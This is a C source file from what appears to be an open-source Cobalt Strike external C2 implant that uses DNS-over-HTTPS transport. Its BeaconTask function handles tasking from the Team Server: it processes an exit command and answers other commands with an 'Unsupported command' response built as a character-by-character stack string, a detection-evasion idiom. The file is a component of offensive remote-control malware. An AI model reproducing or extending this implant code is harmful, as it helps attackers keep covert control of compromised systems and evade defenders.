/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#include "common.h"

/*-
 *
 * BeaconTask
 *
 * Purpose:
 *
 * Executes the requested task, and returns
 * an unencryptes response to send to Team
 * Server.
 *
-*/
DEFINESEC(B) PBEACON_TASK_RES_HDR BeaconTask( PBEACON_INSTANCE Ins, PBEACON_TASK_REQ_HDR Req )
{
	PBEACON_TASK_RES_HDR Res = NULL;
	PVOID                Ptr = NULL;
	ULONG                Cbs = 0;
	UCHAR                Err[MAX_PATH];

	if ((Ptr = BufferCreate( Ins, sizeof( BEACON_TASK_RES_HDR ) )))
	{
		switch ( Req->CallId )
		{
			case BEACON_TASK_EXIT_REQUEST:
				Ins->IsOnline = FALSE;
				Cbs = BEACON_TASK_EXIT_CALLBACK;
				break;
			default:
				Err[0]  = 'U';
				Err[1]  = 'n';
				Err[2]  = 's';
				Err[3]  = 'u';
				Err[4]  = 'p';
				Err[5]  = 'p';
				Err[6]  = 'o';
				Err[7]  = 'r';
				Err[8]  = 't';
				Err[9]  = 'e';
				Err[10] = 'd';
				Err[11] = ' ';
				Err[12] = 'c';
				Err[13] = 'o';
				Err[14] = 'm';
				Err[15] = 'm';
				Err[16] = 'a';
				Err[17] = 'n';
				Err[18] = 'd';
				Err[19] = 0x0;
				Ptr = BufferAddUI4( Ins, Ptr, 0 );
				Ptr = BufferAddUI4( Ins, Ptr, 0 );
				Ptr = BufferAddUI4( Ins, Ptr, 0 );
				Ptr = BufferAddRaw( Ins, Ptr, Err, strlen(Err) );
				break;
		};

		if (( Res = Ins->api.LocalLock( Ptr )))
		{
			Res->Counter = Ins->LastTask++;
			Res->Length  = Ins->api.LocalSize( Ptr ) - 8;
			Res->CallId  = Cbs;
			Ins->api.LocalUnlock( Ptr );

			return Ptr;
		};
		Ins->api.LocalFree( Res );
	};
	return NULL;
};
